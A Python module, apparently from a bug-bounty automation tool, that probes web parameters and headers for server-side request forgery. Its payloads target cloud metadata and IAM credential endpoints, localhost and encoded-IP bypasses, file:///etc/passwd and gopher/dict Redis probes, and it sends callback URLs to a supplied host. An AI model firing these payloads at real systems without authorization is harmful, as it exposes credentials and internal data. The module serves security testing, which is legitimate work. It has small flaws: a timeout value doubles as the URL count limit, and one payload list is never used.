"""
SSRF (Server-Side Request Forgery) Scanner.

Detects SSRF by injecting callback URLs into parameters that may trigger server-side requests.
Typical payout: $3,000 - $20,000.

Techniques:
  - URL parameter injection (url=, redirect=, proxy=, img=, etc.)
  - Header injection (X-Forwarded-For, Referer, Origin)
  - Blind SSRF via OOB callbacks (DNS + HTTP)
  - Internal IP access detection
  - Cloud metadata endpoint access (169.254.169.254)
  - Protocol smuggling (gopher://, file://, dict://)
"""

import logging
import os
import re
import time
from typing import Any
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse, quote

import requests

logger = logging.getLogger("scanner.ssrf")

SSRF_ENABLED = os.getenv("SSRF_SCANNER_ENABLED", "true").lower() in ("1", "true", "yes")
SSRF_TIMEOUT = int(os.getenv("SSRF_TIMEOUT", "8"))

SSRF_PARAMS = {
    "url", "uri", "redirect", "redirect_url", "redirect_uri", "return", "return_url",
    "next", "next_url", "goto", "dest", "destination", "target", "link", "site",
    "proxy", "proxy_url", "forward", "forward_url", "callback", "callback_url",
    "img", "img_url", "image", "image_url", "src", "source", "load", "fetch",
    "path", "file", "page", "feed", "host", "domain", "ref", "reference",
    "continue", "window", "data", "request", "endpoint", "api", "api_url",
    "webhook", "webhook_url", "ping", "ping_url", "download", "download_url",
    "preview", "preview_url", "view", "view_url", "open", "include",
}

INTERNAL_INDICATORS = [
    "root:", "daemon:", "[boot]",
    "AWS", "ami-id", "instance-id", "iam",
    "compute.internal", "metadata.google",
    "169.254.169.254",
    "localhost", "127.0.0.1",
    "Connection refused", "No route to host",
]

METADATA_PAYLOADS = [
    ("http://169.254.169.254/latest/meta-data/", "aws_metadata", "AWS EC2 Metadata"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "aws_iam", "AWS IAM Credentials"),
    ("http://metadata.google.internal/computeMetadata/v1/", "gcp_metadata", "GCP Metadata"),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "azure_metadata", "Azure IMDS"),
    ("http://100.100.100.200/latest/meta-data/", "alibaba_metadata", "Alibaba Cloud Metadata"),
    ("http://169.254.170.2/v2/credentials", "ecs_credentials", "AWS ECS Task Credentials"),
]

INTERNAL_PAYLOADS = [
    ("http://127.0.0.1/", "localhost", "Localhost access"),
    ("http://127.0.0.1:22/", "localhost_ssh", "Localhost SSH"),
    ("http://127.0.0.1:3306/", "localhost_mysql", "Localhost MySQL"),
    ("http://127.0.0.1:6379/", "localhost_redis", "Localhost Redis"),
    ("http://127.0.0.1:9200/", "localhost_elastic", "Localhost Elasticsearch"),
    ("http://[::1]/", "ipv6_localhost", "IPv6 Localhost"),
    ("http://0.0.0.0/", "zero_ip", "0.0.0.0 access"),
    ("http://0177.0.0.1/", "octal_localhost", "Octal localhost bypass"),
    ("http://2130706433/", "decimal_localhost", "Decimal localhost bypass"),
    ("http://0x7f000001/", "hex_localhost", "Hex localhost bypass"),
    ("http://localtest.me/", "dns_rebind", "DNS rebinding via localtest.me"),
]

PROTOCOL_PAYLOADS = [
    ("file:///etc/passwd", "file_read", "Local file read via file://"),
    ("file:///etc/hostname", "file_hostname", "Hostname read via file://"),
    ("dict://127.0.0.1:6379/INFO", "dict_redis", "Redis access via dict://"),
    ("gopher://127.0.0.1:6379/_INFO%0d%0a", "gopher_redis", "Redis via gopher://"),
]

_stats = {
    "urls_tested": 0,
    "params_tested": 0,
    "ssrf_found": 0,
    "blind_ssrf_payloads": 0,
    "errors": 0,
}


def get_ssrf_stats() -> dict[str, Any]:
    return dict(_stats)


def _find_ssrf_params(url: str) -> list[tuple[str, str]]:
    """Find URL parameters that might be vulnerable to SSRF."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    ssrf_candidates = []

    for param_name, values in params.items():
        if param_name.lower() in SSRF_PARAMS:
            ssrf_candidates.append((param_name, values[0] if values else ""))
            continue
        for v in values:
            if v and ("http" in v.lower() or "://" in v or "." in v):
                ssrf_candidates.append((param_name, v))
                break

    return ssrf_candidates


def _build_ssrf_url(url: str, param_name: str, payload: str) -> str:
    """Replace a parameter value with SSRF payload."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param_name] = [payload]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _check_ssrf_response(resp: requests.Response, payload_type: str) -> dict[str, Any] | None:
    """Analyze response for SSRF indicators."""
    body = resp.text[:5000].lower()
    headers_str = str(dict(resp.headers)).lower()

    if payload_type in ("aws_metadata", "aws_iam"):
        if any(indicator in body for indicator in ["ami-id", "instance-id", "iam", "security-credentials"]):
            return {"confirmed": True, "type": "cloud_metadata", "cloud": "AWS"}

    if payload_type == "gcp_metadata":
        if any(indicator in body for indicator in ["project-id", "instance/", "computemetadata"]):
            return {"confirmed": True, "type": "cloud_metadata", "cloud": "GCP"}

    if payload_type == "azure_metadata":
        if any(indicator in body for indicator in ["compute", "vmid", "subscriptionid"]):
            return {"confirmed": True, "type": "cloud_metadata", "cloud": "Azure"}

    if payload_type == "file_read":
        if "root:" in body or "daemon:" in body or "/bin/" in body:
            return {"confirmed": True, "type": "local_file_read"}

    if payload_type.startswith("localhost") or payload_type in ("zero_ip", "octal_localhost", "decimal_localhost", "hex_localhost"):
        if resp.status_code == 200 and len(body) > 50:
            orig_domain = urlparse(resp.url).hostname
            if orig_domain and "127.0.0.1" not in (orig_domain or "") and "localhost" not in (orig_domain or ""):
                return {"confirmed": True, "type": "internal_access"}

    if any(indicator.lower() in body for indicator in INTERNAL_INDICATORS):
        if resp.status_code == 200:
            return {"confirmed": True, "type": "internal_indicator_leak"}

    return None


def scan_url_for_ssrf(
    url: str,
    callback_host: str | None = None,
    headers: dict | None = None,
) -> list[dict[str, Any]]:
    """Scan a single URL for SSRF vulnerabilities."""
    if not SSRF_ENABLED:
        return []

    findings = []
    req_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"}
    if headers:
        req_headers.update(headers)

    ssrf_params = _find_ssrf_params(url)
    if not ssrf_params:
        return []

    for param_name, original_value in ssrf_params:
        all_payloads = METADATA_PAYLOADS + INTERNAL_PAYLOADS

        for payload_url, payload_type, payload_desc in all_payloads:
            test_url = _build_ssrf_url(url, param_name, payload_url)

            try:
                resp = requests.get(
                    test_url, headers=req_headers,
                    timeout=SSRF_TIMEOUT, allow_redirects=True,
                )
                _stats["params_tested"] += 1

                result = _check_ssrf_response(resp, payload_type)
                if result:
                    severity = "critical" if result["type"] == "cloud_metadata" else "high"
                    finding = {
                        "severity": severity,
                        "code": f"ssrf_{payload_type}",
                        "title": f"SSRF: {payload_desc}",
                        "evidence": (
                            f"URL: {test_url} | "
                            f"Param: {param_name} | "
                            f"Payload: {payload_url} | "
                            f"Status: {resp.status_code} | "
                            f"Response length: {len(resp.text)}"
                        )[:200],
                        "ssrf_type": result["type"],
                        "param_name": param_name,
                        "payload": payload_url,
                        "test_url": test_url,
                    }
                    findings.append(finding)
                    _stats["ssrf_found"] += 1
                    logger.info("[SSRF] FOUND: %s via param '%s' on %s",
                                payload_desc, param_name, url)
                    break

            except requests.RequestException:
                continue

            time.sleep(0.3)

        if callback_host:
            blind_payloads = [
                f"https://{callback_host}/ssrf/{param_name}",
                f"http://{callback_host}/ssrf/{param_name}",
                f"//{callback_host}/ssrf/{param_name}",
            ]
            for blind_payload in blind_payloads:
                test_url = _build_ssrf_url(url, param_name, blind_payload)
                try:
                    requests.get(test_url, headers=req_headers, timeout=SSRF_TIMEOUT)
                    _stats["blind_ssrf_payloads"] += 1
                except requests.RequestException:
                    pass
                time.sleep(0.2)

    _stats["urls_tested"] += 1
    return findings


def scan_for_ssrf(
    discovered_urls: list[str],
    callback_host: str | None = None,
    headers: dict | None = None,
) -> list[dict[str, Any]]:
    """Scan multiple discovered URLs for SSRF."""
    if not SSRF_ENABLED:
        return []

    all_findings = []
    urls_with_params = [u for u in discovered_urls if "?" in u and _find_ssrf_params(u)]

    logger.info("[SSRF] Testing %d URLs with SSRF-prone parameters", len(urls_with_params))

    for url in urls_with_params[:SSRF_TIMEOUT]:
        try:
            findings = scan_url_for_ssrf(url, callback_host, headers)
            all_findings.extend(findings)
        except Exception as e:
            logger.debug("[SSRF] Error scanning %s: %s", url, e)
            _stats["errors"] += 1

    return all_findings


def scan_headers_for_ssrf(
    url: str,
    callback_host: str,
) -> list[dict[str, Any]]:
    """Test SSRF via HTTP headers (X-Forwarded-For, Referer, etc.)."""
    if not SSRF_ENABLED or not callback_host:
        return []

    findings = []
    base_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"}

    ssrf_headers = [
        ("X-Forwarded-For", f"https://{callback_host}/xff"),
        ("X-Forwarded-Host", callback_host),
        ("X-Original-URL", f"https://{callback_host}/xoriginal"),
        ("X-Rewrite-URL", f"https://{callback_host}/xrewrite"),
        ("Referer", f"https://{callback_host}/referer"),
        ("X-Custom-IP-Authorization", "127.0.0.1"),
        ("X-Forwarded-Port", "443"),
        ("X-Real-IP", "127.0.0.1"),
    ]

    for header_name, header_value in ssrf_headers:
        try:
            test_headers = {**base_headers, header_name: header_value}
            resp = requests.get(url, headers=test_headers, timeout=SSRF_TIMEOUT, allow_redirects=False)

            location = resp.headers.get("Location", "")
            if callback_host in location:
                findings.append({
                    "severity": "high",
                    "code": f"ssrf_header_{header_name.lower().replace('-', '_')}",
                    "title": f"SSRF via {header_name} header",
                    "evidence": f"Header: {header_name}={header_value} -> Location: {location}"[:200],
                    "param_name": header_name,
                    "ssrf_type": "header_injection",
                })
                _stats["ssrf_found"] += 1

        except requests.RequestException:
            continue
        time.sleep(0.2)

    return findings


def scan_target_for_ssrf(
    domain: str,
    crawled_urls: list[str],
    wayback_urls: list[str],
    paramspider_urls: list[str] | None = None,
    callback_host: str | None = None,
) -> list[dict[str, Any]]:
    """Convenience: scan a bounty target for SSRF using all discovered URLs."""
    all_urls = list(set(crawled_urls + wayback_urls + (paramspider_urls or [])))
    domain_urls = [u for u in all_urls if domain in u]

    if not domain_urls:
        return []

    findings = scan_for_ssrf(domain_urls, callback_host)

    if callback_host:
        base_url = f"https://{domain}"
        header_findings = scan_headers_for_ssrf(base_url, callback_host)
        findings.extend(header_findings)

    return findings
